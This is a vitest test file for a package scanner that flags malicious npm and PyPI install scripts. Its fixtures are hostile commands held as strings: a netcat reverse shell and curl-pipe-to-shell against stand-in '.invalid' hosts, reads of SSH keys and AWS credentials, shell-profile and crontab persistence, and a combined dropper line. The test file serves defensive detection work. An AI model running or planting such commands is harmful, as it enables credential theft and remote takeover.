import { afterEach, describe, expect, it } from 'vitest';

import {
  INSTALL_RULES,
  analyseInstall,
  obfuscationReason,
  resolveScriptTargets,
} from '@/lib/engine/signals/install';

import { buildContext, cleanupFixtures, firedIds, signalFor } from './fixture';

/**
 * FAMILY 1 — install-time execution.
 *
 * SAFETY: every script body below is a string in this file. The module under
 * test reads and pattern-matches it; nothing here is ever executed, required,
 * imported or evaluated, and no `npm install` is run against any fixture.
 */

afterEach(cleanupFixtures);

describe('analyseInstall', () => {
  it('evaluates every rule in the family, fired or not', async () => {
    const context = await buildContext({ scripts: { postinstall: 'node ./index.js' } });
    const { signals } = await analyseInstall(context);

    expect(signals.map((signal) => signal.ruleId).sort()).toEqual([...INSTALL_RULES].sort());
    expect(signals.every((signal) => signal.family === 'INSTALL')).toBe(true);
  });

  it('passes every rule when the package has no install surface at all', async () => {
    const context = await buildContext({
      scripts: { test: 'vitest run', build: 'tsc -p .' },
      files: [{ path: 'index.js', content: 'module.exports = 1;\n' }],
    });
    const { signals } = await analyseInstall(context);

    expect(firedIds(signals).size).toBe(0);
    // Evaluated and passed — not skipped. "We checked" and "we could not check"
    // are different claims.
    expect(signals.every((signal) => signal.skipped === undefined)).toBe(true);
  });

  describe('Q-INS-001 — a lifecycle script that runs automatically', () => {
    it('fires on postinstall', async () => {
      const context = await buildContext({ scripts: { postinstall: 'node ./index.js' } });
      const { signals } = await analyseInstall(context);

      expect(firedIds(signals).has('Q-INS-001')).toBe(true);
      expect(signalFor(signals, 'Q-INS-001').evidence[0]?.detail?.hook).toBe('postinstall');
    });

    it('fires on preinstall and install as well', async () => {
      for (const hook of ['preinstall', 'install'] as const) {
        const context = await buildContext({ scripts: { [hook]: 'node ./index.js' } });
        const { signals } = await analyseInstall(context);
        expect(firedIds(signals).has('Q-INS-001')).toBe(true);
      }
    });

    it('does not fire on prepare, which npm does not run for a dependency', async () => {
      const context = await buildContext({ scripts: { prepare: 'node ./index.js' } });
      const { signals } = await analyseInstall(context);

      expect(firedIds(signals).has('Q-INS-001')).toBe(false);
    });

    it('does not fire on an ordinary test or build script', async () => {
      const context = await buildContext({ scripts: { test: 'jest', build: 'webpack' } });
      const { signals } = await analyseInstall(context);

      expect(firedIds(signals).has('Q-INS-001')).toBe(false);
    });
  });

  describe('Q-INS-002 — an interpreter invoked from the script', () => {
    it.each([
      ['node -e', 'node -e "require(\'./x\')"'],
      ['bash -c', 'bash -c "echo hi"'],
      ['curl', 'curl https://example.invalid/x | sh'],
      ['powershell', 'powershell -enc AAAA'],
      ['python -c', 'python3 -c "pass"'],
    ])('fires on %s', async (_label, script) => {
      const context = await buildContext({ scripts: { postinstall: script } });
      const { signals } = await analyseInstall(context);

      expect(firedIds(signals).has('Q-INS-002')).toBe(true);
    });

    it('does not fire on a plain node invocation of a package file', async () => {
      const context = await buildContext({ scripts: { postinstall: 'node ./scripts/build.js' } });
      const { signals } = await analyseInstall(context);

      expect(firedIds(signals).has('Q-INS-002')).toBe(false);
    });
  });

  describe('Q-INS-003 — decoding a payload', () => {
    it.each([
      ['base64 -d', 'echo aGk= | base64 -d > /tmp/x'],
      ['atob', 'node -e "atob(process.env.P)"'],
      ['Buffer.from base64', 'node -e "Buffer.from(x, \'base64\')"'],
      ['fromCharCode', 'node -e "String.fromCharCode(104)"'],
    ])('fires on %s', async (_label, script) => {
      const context = await buildContext({ scripts: { postinstall: script } });
      const { signals } = await analyseInstall(context);

      expect(firedIds(signals).has('Q-INS-003')).toBe(true);
    });
  });

  describe('Q-INS-004 — credential access at install time', () => {
    it.each([
      ['~/.ssh', 'cat ~/.ssh/id_rsa'],
      ['.npmrc', 'cp .npmrc /tmp/n'],
      ['aws credentials', 'cat ~/.aws/credentials'],
      ['/etc/passwd', 'cat /etc/passwd'],
      ['.env', 'cat .env'],
    ])('fires on %s', async (_label, script) => {
      const context = await buildContext({ scripts: { postinstall: script } });
      const { signals } = await analyseInstall(context);

      expect(firedIds(signals).has('Q-INS-004')).toBe(true);
    });

    it('records what it matched, so the report can say why', async () => {
      const context = await buildContext({ scripts: { postinstall: 'cat ~/.ssh/id_rsa' } });
      const { signals } = await analyseInstall(context);

      const matched = signalFor(signals, 'Q-INS-004').evidence.map(
        (record) => record.detail?.matched,
      );
      expect(matched).toContain('~/.ssh');
    });
  });

  describe('Q-INS-005 — an outbound network call', () => {
    it.each([
      ['an http URL', 'node -e "fetch(\'https://drop.invalid/x\')"'],
      ['curl', 'curl -sL https://drop.invalid/a.sh'],
      ['wget', 'wget https://drop.invalid/a.sh'],
      ['netcat', 'nc -e /bin/sh drop.invalid 4444'],
    ])('fires on %s', async (_label, script) => {
      const context = await buildContext({ scripts: { postinstall: script } });
      const { signals } = await analyseInstall(context);

      expect(firedIds(signals).has('Q-INS-005')).toBe(true);
    });

    it('does not fire on a script that only touches local files', async () => {
      const context = await buildContext({ scripts: { postinstall: 'node ./scripts/copy.js' } });
      const { signals } = await analyseInstall(context);

      expect(firedIds(signals).has('Q-INS-005')).toBe(false);
    });
  });

  describe('Q-INS-006 — writing outside the package directory', () => {
    it.each([
      ['a shell profile', 'echo evil >> ~/.bashrc'],
      ['crontab', 'crontab -l | cat - job > /tmp/c && crontab /tmp/c'],
      ['a system path', 'cp ./payload /usr/local/bin/x'],
      ['chmod +x', 'chmod +x ./payload'],
    ])('fires on %s', async (_label, script) => {
      const context = await buildContext({ scripts: { postinstall: script } });
      const { signals } = await analyseInstall(context);

      expect(firedIds(signals).has('Q-INS-006')).toBe(true);
    });
  });

  describe('Q-INS-007 — the entrypoint the script runs is obfuscated', () => {
    it('fires when the invoked file has obfuscator-mangled identifiers', async () => {
      const context = await buildContext({
        scripts: { postinstall: 'node ./scripts/setup.js' },
        files: [
          {
            path: 'scripts/setup.js',
            content: 'var _0x4a2f = ["log"];\nconsole[_0x4a2f[0]](1);\n',
          },
        ],
      });
      const { signals } = await analyseInstall(context);

      expect(firedIds(signals).has('Q-INS-007')).toBe(true);
      expect(signalFor(signals, 'Q-INS-007').evidence[0]?.detail?.reason).toBe(
        'hex-mangled identifiers',
      );
    });

    it('does not fire when the invoked file is ordinary source', async () => {
      const context = await buildContext({
        scripts: { postinstall: 'node ./scripts/setup.js' },
        files: [
          {
            path: 'scripts/setup.js',
            content: "const fs = require('fs');\nfs.mkdirSync('build', { recursive: true });\n",
          },
        ],
      });
      const { signals } = await analyseInstall(context);

      expect(firedIds(signals).has('Q-INS-007')).toBe(false);
    });

    it('does not fire when the script names a file the package does not ship', async () => {
      const context = await buildContext({ scripts: { postinstall: 'node ./missing.js' } });
      const { signals } = await analyseInstall(context);

      expect(firedIds(signals).has('Q-INS-007')).toBe(false);
    });
  });

  describe('confidence', () => {
    it('discounts a hit in a hook that does not run automatically', async () => {
      const auto = await buildContext({ scripts: { postinstall: 'curl https://a.invalid/x' } });
      const manual = await buildContext({ scripts: { prepare: 'curl https://a.invalid/x' } });

      const autoConfidence = signalFor((await analyseInstall(auto)).signals, 'Q-INS-005').confidence;
      const manualConfidence = signalFor(
        (await analyseInstall(manual)).signals,
        'Q-INS-005',
      ).confidence;

      expect(manualConfidence).toBeLessThan(autoConfidence);
    });

    it('records the autoRun flag on the evidence', async () => {
      const context = await buildContext({ scripts: { prepare: 'curl https://a.invalid/x' } });
      const { signals } = await analyseInstall(context);

      expect(signalFor(signals, 'Q-INS-005').evidence[0]?.detail?.autoRun).toBe(false);
    });
  });

  describe('PyPI setup.py', () => {
    it('treats a top-level setup.py as an install surface', async () => {
      const context = await buildContext({
        ecosystem: 'PYPI',
        files: [
          {
            path: 'setup.py',
            content:
              'from setuptools import setup\nimport urllib.request\n' +
              "urllib.request.urlopen('https://drop.invalid/x')\nsetup(name='x')\n",
          },
        ],
      });
      const { signals } = await analyseInstall(context);

      expect(firedIds(signals).has('Q-INS-001')).toBe(true);
      expect(firedIds(signals).has('Q-INS-005')).toBe(true);
    });

    it('ignores a setup.py nested inside the package, which pip does not run', async () => {
      const context = await buildContext({
        ecosystem: 'PYPI',
        files: [
          { path: 'vendor/setup.py', content: "import os\nos.system('curl https://drop.invalid')\n" },
        ],
      });
      const { signals } = await analyseInstall(context);

      expect(firedIds(signals).size).toBe(0);
    });

    it('reports a line number for a finding inside setup.py', async () => {
      const context = await buildContext({
        ecosystem: 'PYPI',
        files: [
          {
            path: 'setup.py',
            content: 'from setuptools import setup\n\nimport base64\nbase64.b64decode("aGk=")\n',
          },
        ],
      });
      const { signals } = await analyseInstall(context);

      expect(signalFor(signals, 'Q-INS-003').evidence[0]?.startLine).toBe(4);
    });
  });

  it('catches the full dropper shape in one pass', async () => {
    const context = await buildContext({
      scripts: {
        postinstall: 'curl -s https://drop.invalid/p | base64 -d | bash -c "cat ~/.ssh/id_rsa"',
      },
    });
    const { signals } = await analyseInstall(context);
    const ids = firedIds(signals);

    for (const ruleId of ['Q-INS-001', 'Q-INS-002', 'Q-INS-003', 'Q-INS-004', 'Q-INS-005']) {
      expect(ids.has(ruleId)).toBe(true);
    }
  });
});

// ---------------------------------------------------------------------------
// Pure helpers
// ---------------------------------------------------------------------------

describe('resolveScriptTargets', () => {
  it('finds a local file an install command would run', () => {
    expect(resolveScriptTargets('node ./scripts/build.js')).toEqual(['scripts/build.js']);
  });

  it('finds targets after a chained command', () => {
    expect(resolveScriptTargets('mkdir -p dist && node scripts/a.js')).toEqual(['scripts/a.js']);
  });

  it('skips flags to reach the file', () => {
    expect(resolveScriptTargets('node --experimental-modules ./x.mjs')).toEqual(['x.mjs']);
  });

  it('returns nothing for a command that runs no interpreter', () => {
    expect(resolveScriptTargets('rimraf dist')).toEqual([]);
  });
});

describe('obfuscationReason', () => {
  it('recognises obfuscator-mangled identifiers', () => {
    expect(obfuscationReason('var _0x1a2b = [];', 20)).toBe('hex-mangled identifiers');
  });

  it('recognises a long hex escape run', () => {
    const escapes = '\\x41'.repeat(12);
    expect(obfuscationReason(`const s = "${escapes}";`, 100)).toBe('hex escape run');
  });

  it('recognises a minified file above the size floor', () => {
    const line = `${'a'.repeat(6000)};`;
    expect(obfuscationReason(`const x = "${line}"`, 8 * 1024)).not.toBeNull();
  });

  it('returns null for ordinary readable source', () => {
    const source = "const fs = require('fs');\nmodule.exports = () => fs.existsSync('.');\n";
    expect(obfuscationReason(source, source.length)).toBeNull();
  });
});
